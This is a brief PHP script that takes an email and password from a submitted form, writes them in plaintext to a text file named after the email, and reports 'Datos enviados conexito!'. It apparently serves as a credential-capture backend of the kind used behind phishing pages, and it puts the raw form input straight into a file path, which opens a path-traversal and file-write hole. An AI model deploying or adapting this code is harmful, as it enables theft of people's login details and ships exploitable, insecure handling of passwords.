<?php
   $correo = $_POST['correo']; 
   $contra = $_POST["contra"];

   $contenido="
   Email: $correo
   Contraseña: $contra \n";
   $archivo=fopen("O:/xampp/htdocs/ProyectoServidor/Logeos/$correo.TXT","w") or die("Hay un ERROR");
       fwrite($archivo,$contenido);
   fclose($archivo);
   

   echo "Datos enviados conexito!";
?>